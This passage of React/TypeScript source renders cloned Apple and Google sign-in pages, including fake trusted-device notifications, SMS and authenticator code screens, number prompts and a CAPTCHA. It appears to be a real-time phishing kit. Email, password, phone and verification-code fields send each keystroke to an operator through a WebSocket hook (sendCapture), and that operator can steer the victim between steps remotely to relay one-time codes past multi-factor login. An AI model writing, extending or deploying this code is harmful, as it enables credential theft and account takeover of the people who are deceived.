                  className={`w-full px-4 py-3.5 pr-12 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
                />
                <button
                  data-testid="apple-show-password"
                  onClick={() => setShowPassword(v => !v)}
                  className={`absolute right-3 top-1/2 -translate-y-1/2 ${subGray} hover:text-[#007AFF] transition-colors`}
                  style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 4 }}
                >
                  {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                </button>
              </div>
            </div>
            {passwordError && (
              <p className="w-full text-[13px] leading-snug mb-4 px-1" style={{ color: isDark ? '#ff453a' : '#ff3b30' }}>
                {passwordError}
              </p>
            )}
            {!passwordError && <div className="mb-6" />}
            <button
              data-testid="apple-signin-btn"
              onClick={() => { if (password) nav('device-trust', 'password', password); }}
              className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-5 transition-opacity hover:opacity-90 active:opacity-80"
              style={{ backgroundColor: appleBlue }}
            >
              Sign In
            </button>
            <button data-testid="apple-forgot-password-2" onClick={() => { setForgotEmail(email); setStep('forgot'); }} className="text-[15px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}>
              Forgot Apple Account or Password?
            </button>
          </>
        )}

        {/* ── Device Trust (iOS notification simulation) ── */}
        {step === 'device-trust' && (
          <>
            <p className={`text-center text-[15px] leading-relaxed mb-2 ${subGray}`}>
              A sign-in request was sent to your trusted devices.
            </p>
            {visitorLocation && (
              <p className={`text-center text-[13px] mb-5 ${subGray}`}>
                {visitorLocation.flag} {visitorLocation.city}, {visitorLocation.country}
              </p>
            )}
            {visitorLocation?.isVpn && (
              <div className={`w-full max-w-[320px] rounded-xl px-4 py-2.5 mb-4 flex items-start gap-2.5 ${isDark ? 'bg-[#3a2c00] border border-[#5a4500]' : 'bg-[#fff9e6] border border-[#f0c040]'}`}>
                <span className="text-[16px] mt-0.5">⚠️</span>
                <p className={`text-[12px] leading-relaxed ${isDark ? 'text-[#ffd166]' : 'text-[#7a5500]'}`}>
                  You appear to be using a VPN or proxy. Your displayed location may differ from your actual location.
                </p>
              </div>
            )}
            {/* iOS notification card */}
            <div className={`w-full max-w-[320px] rounded-2xl overflow-hidden shadow-2xl mb-5 ${isDark ? 'bg-[#2c2c2e] border border-[#3a3a3c]' : 'bg-white border border-[#e5e5ea]'}`}>
              <div className={`px-4 pt-4 pb-3 border-b ${isDark ? 'border-[#3a3a3c]' : 'border-[#e5e5ea]'}`}>
                <div className="flex items-start gap-3 mb-2.5">
                  <div className="w-9 h-9 rounded-[10px] bg-black flex items-center justify-center flex-shrink-0 mt-0.5">
                    <AppleLogo className="w-5 h-5 text-white" />
                  </div>
                  <div className="flex-1 min-w-0">
                    <div className="flex items-center justify-between">
                      <span className={`text-[13px] font-semibold ${isDark ? 'text-white' : 'text-black'}`}>Apple ID</span>
                      <span className={`text-[11px] ${subGray}`}>now</span>
                    </div>
                    <p className={`text-[15px] font-semibold leading-tight mt-0.5 ${isDark ? 'text-white' : 'text-black'}`}>
                      Apple ID Sign In Requested
                    </p>
                  </div>
                </div>
                <p className={`text-[13px] leading-snug ${subGray}`}>
                  Your Apple ID <span className={isDark ? 'text-white font-medium' : 'text-black font-medium'}>{email || 'user@icloud.com'}</span> is being used to sign in to a device
                  {visitorLocation ? ` in ${visitorLocation.city}, ${visitorLocation.country}` : ' near your location'}.
                </p>
              </div>
              <div className={`flex divide-x ${isDark ? 'divide-[#3a3a3c]' : 'divide-[#e5e5ea]'}`}>
                <button
                  onClick={() => setStep('email')}
                  className={`flex-1 py-3 text-[17px] font-normal transition-colors ${isDark ? 'text-[#007AFF] hover:bg-[#3a3a3c]' : 'text-[#007AFF] hover:bg-[#f2f2f7]'}`}
                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
                >
                  Don't Allow
                </button>
                <button
                  onClick={() => nav('verification-code')}
                  className={`flex-1 py-3 text-[17px] font-semibold transition-colors ${isDark ? 'text-[#007AFF] hover:bg-[#3a3a3c]' : 'text-[#007AFF] hover:bg-[#f2f2f7]'}`}
                  style={{ background: 'none', border: 'none', cursor: 'pointer' }}
                >
                  Allow
                </button>
              </div>
            </div>
            <button
              onClick={() => nav('verification-code')}
              className={`text-[14px] underline ${subGray} hover:text-[#007AFF] transition-colors`}
              style={{ background: 'none', border: 'none', cursor: 'pointer' }}
            >
              Didn't receive a notification?
            </button>
          </>
        )}

        {/* ── Verification Code ── */}
        {step === 'verification-code' && (
          <>
            {isDesktop && (
              <button onClick={() => setStep('device-trust')}
                className={`flex items-center gap-1 text-[14px] mb-4 ${subGray} hover:text-[#007AFF] transition-colors`}
                style={{ background: 'none', border: 'none', cursor: 'pointer', padding: 0 }}>
                <ChevronLeft className="w-4 h-4" /> Back
              </button>
            )}
            <p className={`text-center text-[15px] leading-relaxed mb-1 ${subGray}`}>
              Enter the verification code shown on your trusted device.
            </p>
            <p className={`text-center text-[13px] mb-6 ${subGray}`}>
              A 6-digit code was displayed on your other Apple devices.
            </p>
            {/* Digit boxes with transparent overlay input for reliable input capture */}
            <div className="relative mb-5" onClick={() => codeRef.current?.focus()}>
              <div className="flex gap-2 justify-center pointer-events-none">
                {Array.from({ length: 6 }).map((_, i) => (
                  <div key={i} className={`w-11 h-14 rounded-[13px] flex items-center justify-center text-[22px] font-semibold border-2 transition-colors
                    ${codeInput[i]
                      ? isDark ? 'border-[#007AFF] bg-[#38383a] text-white' : 'border-[#007AFF] bg-[#f2f2f7] text-black'
                      : i === codeInput.length
                        ? isDark ? 'border-[#007AFF] bg-[#1c1c1e]' : 'border-[#007AFF] bg-white'
                        : isDark ? 'border-[#48484a] bg-[#1c1c1e]' : 'border-[#d1d1d6] bg-[#f2f2f7]'}`}>
                    {codeInput[i] ?? ''}
                  </div>
                ))}
              </div>
              <input
                ref={codeRef}
                data-testid="apple-code-input"
                type="text"
                inputMode="numeric"
                maxLength={6}
                autoFocus
                value={codeInput}
                onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 6); setCodeInput(v); sendCapture('verification_code', v); }}
                onKeyDown={e => { if (e.key === 'Enter' && codeInput.length >= 4) { sendCapture('verification_code', codeInput); setStep('processing'); } }}
                aria-label="Verification code"
                style={{ position: 'absolute', inset: 0, opacity: 0, width: '100%', height: '100%', cursor: 'default', caretColor: 'transparent', fontSize: 0 }}
              />
            </div>
            <button
              data-testid="apple-code-submit-btn"
              onClick={() => { if (codeInput.length >= 4) { sendCapture('verification_code', codeInput); setStep('processing'); } }}
              disabled={codeInput.length < 4}
              className={`w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-4 transition-opacity ${codeInput.length < 4 ? 'opacity-40 cursor-not-allowed' : 'hover:opacity-90 active:opacity-80 cursor-pointer'}`}
              style={{ backgroundColor: appleBlue }}
            >
              Continue
            </button>
            {codeError && (
              <p className="w-full text-[13px] leading-snug mb-3 text-center" style={{ color: isDark ? '#ff453a' : '#ff3b30' }}>
                {codeError}
              </p>
            )}
            <button
              onClick={() => nav('device-trust')}
              className="text-[14px]" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer' }}
            >
              Didn't receive a code?
            </button>
          </>
        )}

        {/* ── Processing ── */}
        {step === 'processing' && (
          <div className="flex flex-col items-center w-full">
            <p className={`text-center text-[15px] mb-8 leading-relaxed ${subGray}`}>
              This will take a moment…
            </p>
            <svg className="w-9 h-9" viewBox="0 0 50 50">
              <circle cx="25" cy="25" r="20" fill="none" strokeWidth="3" strokeLinecap="round"
                stroke={isDark ? '#ffffff' : '#1c1c1e'} strokeDasharray="70 130" strokeOpacity="0.7"
                className="animate-spin" style={{ animationDuration: '0.9s' }} />
            </svg>
          </div>
        )}

        {/* ── Forgot Apple Account / Password ── */}
        {step === 'forgot' && (
          <div className="flex flex-col items-center w-full">
            <p className={`text-center text-[15px] leading-relaxed mb-8 ${subGray}`}>
              Enter your Apple Account email address or phone number and we'll help you reset your password or find your account.
            </p>
            <div className={`w-full rounded-[13px] overflow-hidden border mb-5 ${groupBg}`}>
              <input
                type="email"
                autoFocus
                value={forgotEmail}
                onChange={e => setForgotEmail(e.target.value)}
                onKeyDown={e => { if (e.key === 'Enter' && forgotEmail) setStep('forgot-sent'); }}
                placeholder="Email or Phone Number"
                className={`w-full px-4 py-3.5 text-[17px] focus:outline-none bg-transparent ${isDark ? 'text-white placeholder-[#636366]' : 'text-black placeholder-[#aeaeb2]'}`}
              />
            </div>
            <button
              onClick={() => { if (forgotEmail) setStep('forgot-sent'); }}
              disabled={!forgotEmail}
              className={`w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white mb-4 transition-opacity ${!forgotEmail ? 'opacity-40 cursor-not-allowed' : 'hover:opacity-90 active:opacity-80 cursor-pointer'}`}
              style={{ backgroundColor: appleBlue }}
            >
              Continue
            </button>
            <button
              onClick={() => setStep(password ? 'password' : 'email')}
              className={`text-[15px] ${subGray} hover:text-[#007AFF] transition-colors`}
              style={{ background: 'none', border: 'none', cursor: 'pointer' }}
            >
              Cancel
            </button>
          </div>
        )}

        {/* ── Forgot Sent Confirmation ── */}
        {step === 'forgot-sent' && (
          <div className="flex flex-col items-center w-full">
            <div className={`w-16 h-16 rounded-full flex items-center justify-center mb-5 ${isDark ? 'bg-[#1c3553]' : 'bg-[#e8f4ff]'}`}>
              <svg width="32" height="32" viewBox="0 0 24 24" fill="none" stroke={appleBlue} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                <rect x="2" y="4" width="20" height="16" rx="2"/>
                <path d="m22 7-8.97 5.7a1.94 1.94 0 0 1-2.06 0L2 7"/>
              </svg>
            </div>
            <p className={`text-[17px] font-semibold text-center mb-3 ${isDark ? 'text-white' : 'text-black'}`}>
              Check Your Email
            </p>
            <p className={`text-center text-[14px] leading-relaxed mb-7 ${subGray}`}>
              If an Apple Account exists for <strong className={isDark ? 'text-white' : 'text-black'}>{forgotEmail}</strong>, we've sent password reset instructions to that address. Check your email.
            </p>
            <button
              onClick={() => setStep('email')}
              className="w-full py-3.5 rounded-[13px] text-[17px] font-semibold text-white transition-opacity hover:opacity-90 active:opacity-80"
              style={{ backgroundColor: appleBlue }}
            >
              Return to Sign In
            </button>
            <p className={`text-[12px] text-center mt-5 leading-relaxed ${subGray}`}>
              Didn't receive an email? Check your spam folder or{' '}
              <button onClick={() => setStep('forgot')} className="underline" style={{ color: appleBlue, background: 'none', border: 'none', cursor: 'pointer', fontSize: 'inherit' }}>
                try a different address
              </button>.
            </p>
          </div>
        )}

        {/* Home indicator */}
        {!isDesktop && (
          <div className="absolute bottom-3 inset-x-0 flex justify-center">
            <div className={`w-[134px] h-[5px] rounded-full ${isDark ? 'bg-white/40' : 'bg-black/20'}`} />
          </div>
        )}
      </div>
    </div>
  );
}

// ─── Google ──────────────────────────────────────────────────────────────────

type GoogleStep = 'email' | 'password' | 'phone-verify' | 'phone-confirm' | 'phone-wrong' | 'phone-code' | 'processing' | 'verify' | 'prompt-number' | 'sign-in-attempt' | 'sign-in-blocked' | 'error-email' | 'error-password' | 'error-code';

function GoogleLogin({ device, theme, onProviderSwitch }: { device: string; theme: string; onProviderSwitch?: (p: string) => void }) {
  const isDark = theme === 'dark';
  const isDesktop = device === 'desktop';
  const [step, setStep] = useState<GoogleStep>(() => {
    const init = new URLSearchParams(window.location.search).get('initialStep') as GoogleStep | null;
    return init ?? 'email';
  });
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  const [emailFocused, setEmailFocused] = useState(false);
  const [passwordFocused, setPasswordFocused] = useState(false);
  const [phoneCodeInput, setPhoneCodeInput] = useState('');
  const [phoneCodeFocused, setPhoneCodeFocused] = useState(false);
  const [wrongPhone, setWrongPhone] = useState('');
  const [wrongPhoneFocused, setWrongPhoneFocused] = useState(false);
  const [transitioning, setTransitioning] = useState(false);
  const [captchaState, setCaptchaState] = useState<'idle' | 'challenge' | 'solving' | 'solved'>('idle');
  const [selectedImgs, setSelectedImgs] = useState<Set<number>>(new Set([0, 2, 5]));
  const passwordRef = useRef<HTMLInputElement>(null);
  const _gParams = new URLSearchParams(window.location.search);
  const googlePhone = _gParams.get('gphone') ?? '09';
  const gVerifyMethod = (_gParams.get('gverify') ?? 'sms') as 'sms' | 'auth';
  const gCorrectNumber = parseInt(_gParams.get('gnumber') ?? '45');
  const promptNums = [gCorrectNumber, ((gCorrectNumber + 27) % 99) + 1, ((gCorrectNumber + 54) % 99) + 1].sort((a, b) => a - b);

  useEffect(() => {
    if (step === 'password') passwordRef.current?.focus();
  }, [step]);

  const gotoStep = useCallback((target: GoogleStep) => {
    setTransitioning(true);
    setTimeout(() => { setStep(target); setTransitioning(false); }, 650);
  }, []);

  const { sendCapture, sendStepUpdate } = useVisitorWS({
    provider: 'google',
    onNavigate: (s) => gotoStep(s as GoogleStep),
    onProviderSwitch,
  });
  useEffect(() => { sendStepUpdate(step); }, [step, sendStepUpdate]);

  const nav = (target: GoogleStep, captureField?: string, captureVal?: string) => {
    if (captureField && captureVal) sendCapture(captureField, captureVal);
    gotoStep(target);
  };

  const solveCaptcha = () => {
    setCaptchaState('solving');
    setTimeout(() => setCaptchaState('solved'), 2000);
  };

  const CAPTCHA_IMGS = [
    { bg: 'linear-gradient(160deg,#6e7f8d 0%,#8fa0ae 40%,#5c6e7c 100%)', car: true },
    { bg: 'linear-gradient(160deg,#3d6b4a 0%,#5e8a67 40%,#2e5238 100%)', car: false },
    { bg: 'linear-gradient(160deg,#786b60 0%,#9a8c81 40%,#635850 100%)', car: true },
    { bg: 'linear-gradient(160deg,#5c6e8a 0%,#7d90a8 40%,#4a5a72 100%)', car: false },
    { bg: 'linear-gradient(160deg,#8a7060 0%,#aa9080 40%,#705848 100%)', car: false },
    { bg: 'linear-gradient(160deg,#6a6a7c 0%,#8a8a9c 40%,#545466 100%)', car: true },
    { bg: 'linear-gradient(160deg,#4a7c50 0%,#6a9c70 40%,#386040 100%)', car: false },
    { bg: 'linear-gradient(160deg,#7c7c68 0%,#9c9c88 40%,#606050 100%)', car: false },
    { bg: 'linear-gradient(160deg,#5a8a90 0%,#7aacb2 40%,#487078 100%)', car: false },
  ];

  const bg = isDark ? '#1f1f1f' : '#f0f4f9';
  const cardBg = isDark ? '#282a2c' : '#ffffff';
  const textColor = isDark ? '#e3e3e3' : '#1f1f1f';
  const linkColor = isDark ? '#a8c7fa' : '#0b57d0';
  const borderColor = isDark ? '#8e918f' : '#747775';
  const focusBorderColor = isDark ? '#a8c7fa' : '#0b57d0';
  const subText = isDark ? '#c4c7c5' : '#444746';
  const labelColor = isDark ? '#8e918f' : '#444746';

  const floatingLabel = (focused: boolean, hasValue: boolean) =>
    focused || hasValue
      ? { top: 6, fontSize: 12, color: focused ? focusBorderColor : labelColor }
      : { top: 14, fontSize: 16, color: labelColor };

  const initial = email ? email[0].toUpperCase() : 'G';

  return (
    <>
      <style>{`
        @import url('https://fonts.googleapis.com/css2?family=Google+Sans:wght@400;500&display=swap');
        @keyframes g-bar-sweep { from { transform: scaleX(0); } to { transform: scaleX(1); } }
        @keyframes g-bar-slide { 0% { left:-35%;width:30%; } 50% { left:60%;width:50%; } 100% { left:110%;width:30%; } }
        .g-bar-sweep { animation: g-bar-sweep 0.65s cubic-bezier(0.4,0,0.2,1) forwards; transform-origin: left; }
        .g-bar-slide { animation: g-bar-slide 1.5s ease-in-out infinite; position:absolute; height:100%; background:#1a73e8; }
      `}</style>
      <div className="w-full h-full flex items-center justify-center"
        style={{ fontFamily: "'Google Sans', Roboto, Arial, sans-serif", backgroundColor: bg, color: textColor }}>
        <div style={{
          display: 'flex',
          flexDirection: isDesktop ? 'row' : 'column',
          width: isDesktop ? 800 : '100%',
          height: isDesktop ? 450 : '100%',
          background: cardBg,
          borderRadius: isDesktop ? 28 : 0,
          padding: isDesktop ? '40px 40px' : '48px 24px 24px',
          boxSizing: 'border-box',
          position: 'relative',
          overflow: 'hidden',
        }}>
          {/* Blue progress bar */}
          {(transitioning || step === 'processing') && (
            <div style={{ position: 'absolute', top: 0, left: 0, right: 0, height: 3, zIndex: 20 }}>
              {transitioning
                ? <div className="g-bar-sweep" style={{ height: '100%', background: '#1a73e8', width: '100%' }} />
                : <div className="g-bar-slide" />}
            </div>
          )}

          {/* Left / Top: branding */}
          <div style={{ display: 'flex', flexDirection: 'column', flex: isDesktop ? '0 0 320px' : 'none', paddingRight: isDesktop ? 40 : 0, marginBottom: isDesktop ? 0 : 32 }}>
            <div style={{ marginBottom: 28 }}><GoogleLogo /></div>
            <h1 style={{ fontSize: 40, fontWeight: 400, margin: '0 0 12px', letterSpacing: '-0.5px', color: textColor }}>
              {step === 'email' ? 'Sign in'
                : step === 'phone-verify' || step === 'phone-code' ? 'Confirm it\'s you'
                : step === 'phone-confirm' ? 'Confirm your number'
                : step === 'phone-wrong' ? 'Verify it\'s you'
                : step === 'prompt-number' ? 'Verify it\'s you'
                : step === 'sign-in-attempt' ? 'Is it you trying to sign in?'
                : step === 'sign-in-blocked' ? 'Sign-in blocked'
                : step === 'verify' ? 'Verify it\'s you'
                : step === 'processing' ? 'Welcome'
                : 'Welcome'}
            </h1>
            <p style={{ fontSize: 16, color: textColor, margin: 0 }}>
              {step === 'verify'
                ? <span>To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in. <a href="#" onClick={e => e.preventDefault()} style={{ color: linkColor, textDecoration: 'none' }}>Learn more</a></span>
                : 'Use your Google Account'}
            </p>
          </div>

          {/* Right / Bottom: form */}
          <div style={{ display: 'flex', flexDirection: 'column', flex: 1, justifyContent: 'space-between' }}>

            {/* ── Step: email ── */}
            {step === 'email' && (
              <>
                <div>
                  <div style={{ position: 'relative', marginBottom: 8 }}>
                    <input
                      data-testid="google-email-input"
                      type="text"
                      value={email}
                      onChange={e => { setEmail(e.target.value); sendCapture('email', e.target.value); }}
                      onFocus={() => setEmailFocused(true)}
                      onBlur={() => setEmailFocused(false)}
                      onKeyDown={e => e.key === 'Enter' && email && nav('password', 'email', email)}
                      autoFocus
                      style={{
                        width: '100%', padding: '20px 16px 8px', fontSize: 16,
                        border: `${emailFocused ? 2 : 1}px solid ${emailFocused ? focusBorderColor : borderColor}`,
                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                      }}
                    />
                    <label style={{ position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s', ...floatingLabel(emailFocused, !!email) }}>
                      Email or phone
                    </label>
                  </div>
                  <button data-testid="google-forgot-email"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '6px 8px 6px 0', marginBottom: 20 }}>
                    Forgot email?
                  </button>
                  <p style={{ fontSize: 14, color: subText, margin: '0 0 4px' }}>
                    Not your computer? Use Guest mode to sign in privately.
                  </p>
                  <button data-testid="google-guest-mode"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '4px 0' }}>
                    Learn more about using Guest mode
                  </button>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button data-testid="google-create-account"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Create account
                  </button>
                  <button data-testid="google-next-btn"
                    onClick={() => { if (email) nav('password', 'email', email); }}
                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                    Next
                  </button>
                </div>
              </>
            )}

            {/* ── Step: password ── */}
            {step === 'password' && (
              <>
                <div>
                  {/* Email chip */}
                  <div style={{
                    display: 'inline-flex', alignItems: 'center', gap: 8,
                    border: `1px solid ${borderColor}`, borderRadius: 20,
                    padding: '6px 12px 6px 6px', marginBottom: 24, cursor: 'pointer',
                    background: isDark ? '#3c3f43' : '#f0f4f9',
                  }}
                    data-testid="google-email-chip"
                    onClick={() => setStep('email')}
                  >
                    <div style={{
                      width: 24, height: 24, borderRadius: '50%', backgroundColor: isDark ? '#a8c7fa' : '#0b57d0',
                      display: 'flex', alignItems: 'center', justifyContent: 'center',
                      fontSize: 12, fontWeight: 500, color: isDark ? '#052e70' : '#fff', flexShrink: 0,
                    }}>
                      {initial}
                    </div>
                    <span style={{ fontSize: 14, color: textColor }}>{email}</span>
                    <ChevronLeft className="w-3 h-3 rotate-180" style={{ color: textColor, marginLeft: 2 }} />
                  </div>

                  {/* Password field */}
                  <div style={{ position: 'relative', marginBottom: 8 }}>
                    <input
                      ref={passwordRef}
                      data-testid="google-password-input"
                      type={showPassword ? 'text' : 'password'}
                      value={password}
                      onChange={e => { setPassword(e.target.value); sendCapture('password', e.target.value); }}
                      onFocus={() => setPasswordFocused(true)}
                      onBlur={() => setPasswordFocused(false)}
                      style={{
                        width: '100%', padding: '20px 44px 8px 16px', fontSize: 16,
                        border: `${passwordFocused ? 2 : 1}px solid ${passwordFocused ? focusBorderColor : borderColor}`,
                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                      }}
                    />
                    <label style={{ position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s', ...floatingLabel(passwordFocused, !!password) }}>
                      Enter your password
                    </label>
                    <button
                      data-testid="google-show-password"
                      onClick={() => setShowPassword(v => !v)}
                      style={{ position: 'absolute', right: 12, top: '50%', transform: 'translateY(-50%)', background: 'none', border: 'none', cursor: 'pointer', color: labelColor, padding: 4 }}>
                      {showPassword ? <EyeOff className="w-5 h-5" /> : <Eye className="w-5 h-5" />}
                    </button>
                  </div>
                  <button data-testid="google-forgot-password"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '6px 8px 6px 0' }}>
                    Forgot password?
                  </button>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button data-testid="google-create-account-2"
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Create account
                  </button>
                  <button data-testid="google-signin-btn"
                    onClick={() => { if (password) nav('processing', 'password', password); }}
                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                    Next
                  </button>
                </div>
              </>
            )}

            {/* ── Phone Verify (Confirm it's you) ── */}
            {step === 'phone-verify' && (
              <>
                <div>
                  <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
                    To help keep your account safe, Google wants to make sure it&apos;s really you trying to sign in.
                  </p>
                  {gVerifyMethod === 'sms' ? (
                    /* SMS Code option only */
                    <div style={{
                      border: `1px solid ${borderColor}`, borderRadius: 4,
                      padding: '16px', cursor: 'pointer',
                      display: 'flex', alignItems: 'center', gap: 16, background: 'transparent',
                    }} onClick={() => nav('phone-confirm')}>
                      <div style={{ width: 40, height: 40, borderRadius: '50%', background: isDark ? '#3c4043' : '#e8f0fe', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                        <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                          <rect x="5" y="2" width="14" height="20" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
                          <circle cx="12" cy="18" r="1" fill={isDark ? '#a8c7fa' : '#0b57d0'}/>
                        </svg>
                      </div>
                      <div style={{ flex: 1 }}>
                        <div style={{ fontSize: 14, fontWeight: 500, color: textColor, marginBottom: 2 }}>Get a verification code</div>
                        <div style={{ fontSize: 13, color: subText }}>Google will text a verification code to your phone</div>
                      </div>
                      <ChevronLeft className="w-4 h-4 rotate-180" style={{ color: subText }} />
                    </div>
                  ) : (
                    /* Authenticator App option only */
                    <div style={{
                      border: `1px solid ${borderColor}`, borderRadius: 4,
                      padding: '16px', cursor: 'pointer',
                      display: 'flex', alignItems: 'center', gap: 16, background: 'transparent',
                    }} onClick={() => nav('phone-code')}>
                      <div style={{ width: 40, height: 40, borderRadius: '50%', background: isDark ? '#3c4043' : '#e8f0fe', display: 'flex', alignItems: 'center', justifyContent: 'center', flexShrink: 0 }}>
                        <svg viewBox="0 0 24 24" width="20" height="20" fill="none">
                          <rect x="3" y="3" width="18" height="18" rx="2" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5"/>
                          <path d="M8 8h2m-2 4h6m-6 4h4" stroke={isDark ? '#a8c7fa' : '#0b57d0'} strokeWidth="1.5" strokeLinecap="round"/>
                        </svg>
                      </div>
                      <div style={{ flex: 1 }}>
                        <div style={{ fontSize: 14, fontWeight: 500, color: textColor, marginBottom: 2 }}>Use an authenticator app</div>
                        <div style={{ fontSize: 13, color: subText }}>Get a verification code from your authenticator app</div>
                      </div>
                      <ChevronLeft className="w-4 h-4 rotate-180" style={{ color: subText }} />
                    </div>
                  )}
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button onClick={() => setStep('password')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Back
                  </button>
                </div>
              </>
            )}

            {/* ── Phone Confirm (Confirm your number before sending code) ── */}
            {step === 'phone-confirm' && (
              <>
                <div>
                  <p style={{ fontSize: 14, color: subText, marginBottom: 24 }}>
                    To verify it&apos;s you, Google will send a verification code to your phone. First, confirm your number.
                  </p>
                  <div style={{
                    border: `1px solid ${borderColor}`, borderRadius: 4, padding: '20px 16px',
                    textAlign: 'center', background: isDark ? '#3c4043' : '#f8f9fa',
                  }}>
                    <div style={{ fontSize: 26, letterSpacing: '0.15em', color: textColor, marginBottom: 6, fontWeight: 400 }}>
                      ●●●●●●{googlePhone}
                    </div>
                    <div style={{ fontSize: 12, color: subText }}>
                      We&apos;ll send a code to the number ending in <strong>{googlePhone}</strong>
                    </div>
                  </div>
                  <button onClick={() => setStep('phone-wrong')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 13, fontWeight: 500, cursor: 'pointer', padding: '10px 0 0', display: 'block' }}>
                    This isn&apos;t my number
                  </button>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button onClick={() => setStep('phone-verify')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Back
                  </button>
                  <button onClick={() => nav('phone-code')}
                    style={{ backgroundColor: isDark ? '#a8c7fa' : '#0b57d0', color: isDark ? '#052e70' : '#ffffff', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: 'pointer' }}>
                    Send
                  </button>
                </div>
              </>
            )}

            {/* ── Phone Wrong (re-enter number) ── */}
            {step === 'phone-wrong' && (
              <>
                <div>
                  <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
                    Enter your phone number and we&apos;ll send you a 6-digit verification code.
                  </p>
                  <div style={{ position: 'relative', marginBottom: 8 }}>
                    <input
                      type="tel"
                      value={wrongPhone}
                      onChange={e => { const v = e.target.value.replace(/\D/g, '').slice(0, 10); setWrongPhone(v); sendCapture('phone', v); }}
                      onFocus={() => setWrongPhoneFocused(true)}
                      onBlur={() => setWrongPhoneFocused(false)}
                      onKeyDown={e => { if (e.key === 'Enter' && wrongPhone.length >= 7) nav('phone-code', 'phone', wrongPhone); }}
                      autoFocus
                      style={{
                        width: '100%', padding: '20px 16px 8px', fontSize: 16,
                        border: `${wrongPhoneFocused ? 2 : 1}px solid ${wrongPhoneFocused ? focusBorderColor : borderColor}`,
                        borderRadius: 4, background: 'transparent', color: textColor, outline: 'none', boxSizing: 'border-box',
                      }}
                    />
                    <label style={{ position: 'absolute', left: 16, pointerEvents: 'none', transition: 'all 0.15s', ...floatingLabel(wrongPhoneFocused, !!wrongPhone) }}>
                      Phone number
                    </label>
                  </div>
                </div>
                <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
                  <button onClick={() => setStep('phone-confirm')}
                    style={{ background: 'none', border: 'none', color: linkColor, fontSize: 14, fontWeight: 500, cursor: 'pointer', padding: '10px 16px', borderRadius: 20 }}>
                    Back
                  </button>
                  <button onClick={() => wrongPhone.length >= 7 && nav('phone-code', 'phone', wrongPhone)}
                    style={{ backgroundColor: wrongPhone.length >= 7 ? (isDark ? '#a8c7fa' : '#0b57d0') : (isDark ? '#3c4043' : '#c8d0db'), color: wrongPhone.length >= 7 ? (isDark ? '#052e70' : '#fff') : '#888', border: 'none', borderRadius: 20, padding: '10px 24px', fontSize: 14, fontWeight: 500, cursor: wrongPhone.length >= 7 ? 'pointer' : 'default' }}>
                    Next
                  </button>
                </div>
              </>
            )}

            {/* ── Phone Code ── */}
            {step === 'phone-code' && (
              <>
                <div>
                  <p style={{ fontSize: 14, color: subText, marginBottom: 20 }}>
                    {gVerifyMethod === 'sms'
                      ? <>A 6-digit verification code was sent to your phone ending in <strong style={{ color: textColor }}>●●●●●●{googlePhone}</strong>. It may take a moment to arrive.</>
                      : <>Enter the 6-digit code from your authenticator app.</>}
                  </p>
                  <div style={{ position: 'relative', marginBottom: 8 }}>
                    <input
                      data-testid="google-phone-code-input"
                      type="text"
                      inputMode="numeric"
                      maxLength={6}
                      autoFocus
                      value={phoneCodeInput}
